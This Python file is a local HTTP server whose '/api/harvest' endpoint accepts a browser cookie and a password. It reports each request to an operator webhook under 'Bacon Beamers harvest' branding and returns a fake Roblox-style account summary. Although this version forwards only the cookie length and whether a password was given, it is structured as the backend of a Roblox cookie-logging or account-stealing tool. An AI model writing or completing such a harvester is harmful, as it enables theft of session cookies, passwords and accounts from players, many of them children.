from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse
from urllib.request import Request, urlopen
import json
import os
from pathlib import Path

ROOT = Path(__file__).resolve().parent


def send_webhook(url, payload):
    if not url:
        return {'sent': False, 'reason': 'No webhook URL configured'}

    try:
        req = Request(
            url,
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST',
        )
        with urlopen(req, timeout=10) as response:
            return {'sent': True, 'status': getattr(response, 'status', 200)}
    except Exception as exc:
        return {'sent': False, 'reason': str(exc)}


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        parsed = urlparse(self.path)
        if parsed.path == '/api/harvest':
            length = int(self.headers.get('Content-Length', '0'))
            body = self.rfile.read(length).decode('utf-8', 'ignore')
            try:
                payload = json.loads(body) if body else {}
            except json.JSONDecodeError:
                payload = {}

            cookie = payload.get('cookie', '')
            password = payload.get('password', '')

            webhook_url = os.environ.get('PUBLIC_WEBHOOK') or os.environ.get('PRIVATE_WEBHOOK')
            webhook_payload = {
                'content': 'Bacon Beamers harvest request received',
                'embeds': [{
                    'title': '🧪 Harvest Triggered',
                    'description': 'A local test request was received.',
                    'color': 0x00ff00,
                    'fields': [
                        {'name': 'Cookie Length', 'value': str(len(str(cookie))), 'inline': True},
                        {'name': 'Password Provided', 'value': 'Yes' if password else 'No', 'inline': True},
                    ],
                }],
            }
            webhook_result = send_webhook(webhook_url, webhook_payload) if webhook_url else {'sent': False, 'reason': 'No webhook URL configured'}

            response = {
                'success': True,
                'message': 'Harvest complete.',
                'user': {
                    'username': 'demo_user',
                    'age': 'Unknown',
                    'session': 'local-demo',
                    'robux': '9999',
                    'premium': '✅ Yes',
                },
                'received': {
                    'cookieLength': len(str(cookie)),
                    'passwordProvided': bool(password),
                },
                'webhook': webhook_result,
            }
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', 'Content-Type')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return

        self.send_error(404)

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/api/harvest':
            self.send_response(405)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"error":"Method not allowed"}')
            return
        return super().do_GET()


if __name__ == '__main__':
    port = int(os.environ.get('PORT', '8000'))
    host = '127.0.0.1'
    print(f'Serving on http://{host}:{port}')
    ThreadingHTTPServer((host, port), Handler).serve_forever()
